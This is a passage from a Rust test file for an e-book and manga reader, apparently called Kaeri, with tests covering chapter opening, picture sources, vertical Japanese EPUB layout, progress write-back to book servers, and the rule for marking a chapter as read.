    assert_eq!(novel_text_place(&novel.text, &pos(0, &[2], 6)), Some((0, 2, 6)));
    assert_eq!(novel_text_place(&novel.text, &pos(2, &[1], 4)), Some((1, 1, 4)));
    let emphasis = &novel.text[0].blocks[1].runs[1];
    assert!(emphasis.emphasis && emphasis.text == "climbed" && emphasis.offset == 11);
    assert_eq!(emphasis.path, [1, 0]);

    // The same book in a web view carries no text.
    h.send(ReaderCommand::Close { session: h.session() });
    let (_, novel) = h.open_novel(OpenAt::Start).await;
    assert!(novel.text.is_empty());
}

/// A text chapter whose open panics on the way fails, as a chapter that cannot open does, and
/// the reader is never left waiting on it.
#[tokio::test]
async fn a_text_chapter_that_panics_while_it_opens_fails_instead_of_waiting() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |_| Vec::new());
    h.failures = true;
    let source = TextSource::new(None, None);
    source.panics.store(true, std::sync::atomic::Ordering::SeqCst);
    h.services.book_sources.registry.put(source);
    h.services.store.set_book_match("texts", "series-1", WORK, 90, true, false, 1).unwrap();
    h.send(ReaderCommand::Open {
        work: WorkId::new(WORK),
        chapter: None,
        at: OpenAt::Start,
        surface: surface(),
    });
    let end = tokio::time::Instant::now() + Duration::from_secs(10);
    while h.failed.is_empty()
        && let Ok(Some(envelope)) = tokio::time::timeout_at(end, h.inbox.recv()).await
    {
        h.carry(envelope);
    }
    assert_eq!(h.failed.len(), 1, "the open failed once: {:?}", h.failed);
    assert!(
        !h.drain().iter().any(|e| matches!(e, ReaderEvent::NovelOpen(_))),
        "no chapter opened"
    );
}

/// A source whose chapters are pictures, three pages each, fetched through the source. With
/// `made`, the source makes each page's bytes itself (a plugin built for the
/// `book-plugin-with-pages` world), its own id standing where an address would.
struct PictureSource {
    manifest: BookSourceManifest,
    made: bool,
}

impl PictureSource {
    fn new(made: bool) -> Self {
        let manifest = BookSourceManifest {
            id: "pictures".into(),
            name: "Pictures".into(),
            version: "1".into(),
            kind: BookSourceKind::Plugin,
            media: vec![Medium::Manga],
            languages: vec!["en".into()],
            allowed_hosts: Vec::new(),
            capabilities: Vec::new(),
        };
        Self { manifest, made }
    }
}

#[async_trait]
impl kaeri_core::traits::BookSource for PictureSource {
    fn manifest(&self) -> &BookSourceManifest {
        &self.manifest
    }

    async fn search(&self, _: &str, _: &BookHints) -> Result<Vec<SeriesHit>, ProviderError> {
        Ok(Vec::new())
    }

    async fn series(&self, id: &str, _: &BookHints) -> Result<SeriesDetail, ProviderError> {
        Ok(SeriesDetail::new(id, id))
    }

    async fn chapters(
        &self,
        _: &str,
        _: &BookHints,
    ) -> Result<Vec<SourceChapter>, ProviderError> {
        Ok(vec![SourceChapter::new("c1", "1")])
    }

    async fn content(
        &self,
        series: &str,
        chapter: &str,
    ) -> Result<ChapterContent, ProviderError> {
        use kaeri_core::books::PageRef;
        Ok(ChapterContent::Images(
            (1..=3)
                .map(|n| match self.made {
                    true => PageRef::made(series, chapter, format!("{chapter}-{n}")),
                    false => PageRef::new(format!("https://pages.example/{chapter}/{n}")),
                })
                .collect(),
        ))
    }

    async fn fetch_page(
        &self,
        page: &kaeri_core::books::PageRef,
    ) -> Result<Vec<u8>, kaeri_core::traits::PageError> {
        // A made page reaches its source with the chapter it belongs to.
        let made = page.made.as_ref().map(|m| (m.series.as_str(), m.chapter.as_str()));
        assert_eq!(made, self.made.then_some(("series-1", "c1")), "{page:?}");
        let shade = page.url.bytes().last().unwrap_or(b'1');
        let picture = image::GrayImage::from_pixel(300, 450, image::Luma([shade]));
        let mut png = Vec::new();
        picture.write_to(&mut Cursor::new(&mut png), image::ImageFormat::Png).unwrap();
        Ok(png)
    }
}

/// A chapter of pictures from a source, with nothing on the shelf, opens in the page reader:
/// pages it names by address and pages it makes itself alike.
#[tokio::test(start_paused = true)]
async fn a_sources_chapter_of_pictures_opens_as_pages() {
    for made in [false, true] {
        let mut h = harness_of(Store::open_in_memory().unwrap(), "manga", |_| Vec::new());
        h.services.book_sources.registry.put(Arc::new(PictureSource::new(made)));
        h.services
            .store
            .set_book_match("pictures", "series-1", WORK, 90, true, false, 1)
            .unwrap();
        let (view, leaves, _) = h.open(OpenAt::Start).await;
        assert_eq!(view.medium, Medium::Manga, "made: {made}");
        assert_eq!(leaves.len(), 4, "three pages and the end page, made: {made}");
    }
}

/// The server a chapter came from, when the person lets Kaeri write progress to it, is told
/// the chapter was read as the reader marks it: Komga's and Kavita's write-back.
#[tokio::test(start_paused = true)]
async fn a_chapter_read_in_the_reader_is_told_to_its_book_server() {
    for allowed in [true, false] {
        let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |_| Vec::new());
        let (tx, mut reports) = tokio::sync::mpsc::unbounded_channel();
        h.services.book_sources.registry.put(TextSource::new(Some(tx), None));
        h.services.store.set_book_match("texts", "series-1", WORK, 90, true, false, 1).unwrap();
        h.services
            .store
            .put_book_server(&kaeri_store::book_sources::BookServer {
                id: "texts".into(),
                kind: "komga".into(),
                name: "Home shelf".into(),
                address: "https://books.example".into(),
                user: Some("reader".into()),
                report_progress: allowed,
                signed_out: false,
                last_seen: None,
            })
            .unwrap();
        // As the launch does once it lets go of background work.
        h.services.book_sources.start_write_back(crate::clock::Clock::default());
        let (view, novel) = h.open_novel(OpenAt::Start).await;
        assert_eq!(novel.spine.len(), 1);
        let chapter = view.chapter.id.as_str().to_owned();
        h.at(pos(0, &[0], 0), 1, 2, TurnHow::Turn);
        let read = h
            .until(|e| match e {
                ReaderEvent::ChapterRead { chapter, .. } => Some(chapter.clone()),
                _ => None,
            })
            .await;
        assert_eq!(read.as_str(), chapter);
        let told = tokio::time::timeout(Duration::from_secs(5), reports.recv()).await;
        if allowed {
            assert_eq!(told.unwrap(), Some(("series-1".into(), "c1".into(), true)));
        } else {
            assert!(told.is_err(), "a server that is not to be told hears nothing: {told:?}");
        }
    }
}

/// A vertical book as Japanese EPUBs are made: a stylesheet setting `vertical-rl` on the root and
/// the spine read right to left.
fn vertical(path: &Path) {
    let file = std::fs::File::create(path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let stored = zip::write::SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Stored);
    zip.start_file("mimetype", stored).unwrap();
    zip.write_all(b"application/epub+zip").unwrap();
    let o = zip::write::SimpleFileOptions::default();
    let mut put = |name: &str, text: &str| {
        zip.start_file(name, o).unwrap();
        zip.write_all(text.as_bytes()).unwrap();
    };
    put(
        "META-INF/container.xml",
        r#"<?xml version="1.0" encoding="utf-8"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="item/standard.opf" media-type="application/oebps-package+xml"/></rootfiles></container>"#,
    );
    put(
        "item/standard.opf",
        r#"<?xml version="1.0" encoding="utf-8"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:00000000-0000-4000-8000-000000000002</dc:identifier><dc:title>灯台守の夜</dc:title><dc:language>ja</dc:language></metadata><manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="css" href="style/book.css" media-type="text/css"/><item id="p1" href="xhtml/p1.xhtml" media-type="application/xhtml+xml"/></manifest><spine page-progression-direction="rtl"><itemref idref="p1"/></spine></package>"#,
    );
    put(
        "item/nav.xhtml",
        r#"<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>目次</title></head><body><nav epub:type="toc"><ol><li><a href="xhtml/p1.xhtml">一</a></li></ol></nav></body></html>"#,
    );
    put(
        "item/style/book.css",
        "html { -epub-writing-mode: vertical-rl; writing-mode: vertical-rl; }\np { text-indent: 1em; }",
    );
    put(
        "item/xhtml/p1.xhtml",
        r#"<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ja"><head><meta charset="utf-8"/><title>一</title><link rel="stylesheet" type="text/css" href="../style/book.css"/></head><body><p>灯台守は階段を上った。</p><p>潮が桟橋の下に満ちてきた。</p></body></html>"#,
    );
    zip.finish().unwrap();
}

#[tokio::test(start_paused = true)]
async fn a_vertical_book_opens_vertical_and_reads_right_to_left() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |books| {
        let path = books.join("Volume 1.epub");
        vertical(&path);
        vec![shelf_file(&path, 1, "epub")]
    });
    let (_, novel) = h.open_novel(OpenAt::Start).await;
    assert_eq!(novel.writing_mode, kaeri_model::reader::WritingMode::VerticalRightToLeft);
    assert_eq!(novel.progression, kaeri_model::reader::ReadDirection::RightToLeft);

    // The document keeps its stylesheet, and the stylesheet keeps the writing mode, so the web
    // view lays it out in columns from the right.
    let doc = h.get(&novel.entry);
    assert_eq!(doc.status, 200);
    let body = text(&doc);
    assert!(body.contains("灯台守は階段を上った。"), "{body}");
    assert!(body.contains("book.css"), "{body}");
    let base = novel.entry.rsplit_once("/xhtml/").unwrap().0;
    let sheet = h.get(&format!("{base}/style/book.css"));
    assert_eq!((sheet.status, sheet.mime.as_str()), (200, "text/css"));
    assert!(text(&sheet).contains("vertical-rl"), "{}", text(&sheet));
}

/// The demo's comic, never fetched from the catalogue, opens under its series' name and reads
/// left to right, as its source says: it is a European comic, not a manga.
#[tokio::test(start_paused = true)]
async fn the_demo_comic_opens_under_its_name_and_reads_left_to_right() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "manga", |_| Vec::new());
    h.services.book_sources.registry.put(Arc::new(PictureSource::new(false)));
    let comic = kaeri_core::reading_demo::COMIC.work_id();
    h.services
        .store
        .set_book_match("pictures", "series-1", comic.as_str(), 90, true, false, 1)
        .unwrap();
    let (view, _, _) = h.open_work(comic, OpenAt::Start).await;
    assert_eq!(view.title, "Pepper&Carrot");
    assert_eq!(view.direction, kaeri_model::reader::ReadDirection::LeftToRight);
}

/// Two chapters opened one after the other can finish out of order: the first one's open,
/// finishing last, must not take the place of the second one's, which still opens.
#[tokio::test(start_paused = true)]
async fn a_chapter_opened_while_the_one_before_is_still_opening_opens() {
    let gate = Arc::new(tokio::sync::Notify::new());
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |_| Vec::new());
    h.services.book_sources.registry.put(TextSource::new(None, Some(gate.clone())));
    h.services.store.set_book_match("texts", "series-1", WORK, 90, true, false, 1).unwrap();
    let work = WorkId::new(WORK);
    h.send(ReaderCommand::Open { work, chapter: None, at: OpenAt::Start, surface: surface() });
    // The chapters are listed off the actor; the session starts once they arrive, and its
    // first chapter's open then waits at the gate.
    while h.reader.session.is_none() {
        let envelope = h.inbox.recv().await.expect("the inbox is open");
        h.carry(envelope);
    }
    let second = h.reader.session.as_ref().unwrap().chapters[1].id.clone();
    h.send(ReaderCommand::OpenChapter { session: h.session(), chapter: second.clone() });

    // The second chapter's open finishes first, then the first one's, before either is
    // carried out.
    tokio::time::sleep(Duration::from_millis(10)).await;
    gate.notify_one();
    tokio::time::sleep(Duration::from_millis(10)).await;

    let opened = h.drain().into_iter().find_map(|e| match e {
        ReaderEvent::NovelOpen(view) => Some(view.chapter),
        _ => None,
    });
    assert_eq!(opened, Some(second));
}

/// A plugin's novel with the example books plugin's first Saltglass chapter: its picture on
/// `pages.example`, which answers, and a second on `slow.example`, which never does.
struct Illustrated {
    manifest: BookSourceManifest,
}

impl Illustrated {
    fn new() -> Arc<Self> {
        Arc::new(Self {
            manifest: BookSourceManifest {
                id: "illustrated".into(),
                name: "Illustrated".into(),
                version: "1".into(),
                kind: BookSourceKind::Plugin,
                media: vec![Medium::Novel],
                languages: vec!["en".into()],
                allowed_hosts: vec!["pages.example".into(), "slow.example".into()],
                capabilities: Vec::new(),
            },
        })
    }
}

#[async_trait]
impl kaeri_core::traits::BookSource for Illustrated {
    fn manifest(&self) -> &BookSourceManifest {
        &self.manifest
    }

    async fn search(&self, _: &str, _: &BookHints) -> Result<Vec<SeriesHit>, ProviderError> {
        Ok(Vec::new())
    }

    async fn series(&self, id: &str, _: &BookHints) -> Result<SeriesDetail, ProviderError> {
        Ok(SeriesDetail::new(id, "Saltglass Letters"))
    }

    async fn chapters(
        &self,
        _: &str,
        _: &BookHints,
    ) -> Result<Vec<SourceChapter>, ProviderError> {
        Ok(vec![SourceChapter::new("saltglass-1", "1")])
    }

    async fn content(&self, _: &str, _: &str) -> Result<ChapterContent, ProviderError> {
        Ok(ChapterContent::Text(
            "<h2>The First Bottle</h2><p>The bottle was cold, and the letter inside was dry.</p>\
             <p>It began, as they all did, with the tide.</p>\
             <p><img src=\"https://pages.example/saltglass/bottle.jpg\" \
             alt=\"A green bottle on wet sand\"/></p>\
             <p><img src=\"https://slow.example/saltglass/gull.jpg\" alt=\"A gull\"/></p>"
                .into(),
        ))
    }

    async fn fetch_page(
        &self,
        page: &kaeri_core::books::PageRef,
    ) -> Result<Vec<u8>, kaeri_core::traits::PageError> {
        if page.url.starts_with("https://slow.example/") {
            return std::future::pending().await;
        }
        Ok(crate::read_sources::pictures::ONE_PIXEL_PNG.to_vec())
    }
}

#[tokio::test(start_paused = true)]
async fn a_text_chapter_opens_with_its_pictures_and_a_dead_host_holds_it_back_seconds_at_most()
{
    use crate::read_sources::pictures::OPENING_WAIT;
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |_| Vec::new());
    h.services.book_sources.registry.put(Illustrated::new());
    h.services
        .store
        .set_book_match("illustrated", "series-1", WORK, 90, true, false, 1)
        .unwrap();
    let began = tokio::time::Instant::now();
    let (_, novel) = h.open_novel(OpenAt::Start).await;
    let waited = began.elapsed();
    assert!(waited >= OPENING_WAIT && waited < OPENING_WAIT * 2, "{waited:?}");

    let doc = text(&h.get(&novel.entry));
    assert!(doc.contains("src=\"images/1\" alt=\"A green bottle on wet sand\""), "{doc}");
    assert!(doc.contains("src=\"images/2\" alt=\"A gull\""), "{doc}");
    assert!(!doc.contains(".example/"), "no web address reaches the page: {doc}");
    // The paginator keeps a box for the one still coming.
    assert!(doc.contains("&quot;waiting&quot;:[&quot;images/2&quot;]"), "{doc}");

    let at = |path: &str| novel.entry.replace(crate::reading::novel::TEXT_CHAPTER, path);
    let bottle = h.get(&at("images/1"));
    assert_eq!((bottle.status, bottle.mime.as_str()), (200, "image/png"));
    assert_eq!(h.get(&at("images/2?n=1")).status, 503, "still coming");
    assert_eq!(h.get(&at("images/2?state&n=1")).status, 404, "and not failed");
}

/// A novel's view reports its place as it scrolls within the last page: those reports keep the
/// read rule's wait going, so the chapter counts as read once it has held.
#[tokio::test(start_paused = true)]
async fn scroll_reports_within_the_last_page_let_the_read_rule_run_out() {
    let mut h = novel_harness();
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let last = novel.spine.iter().rposition(|s| s.linear).unwrap() as u32;
    h.at(pos(last, &[2], 0), 1, 2, TurnHow::Turn);
    let mut read = 0;
    for step in 1..=10 {
        tokio::time::sleep(Duration::from_millis(500)).await;
        h.at(pos(last, &[2], step * 3), 1, 2, TurnHow::Placed);
        tokio::task::yield_now().await;
        read +=
            h.drain().iter().filter(|e| matches!(e, ReaderEvent::ChapterRead { .. })).count();
    }
    assert_eq!(read, 1, "counted read once");
    assert!(h.kept("1").unwrap().read);
}
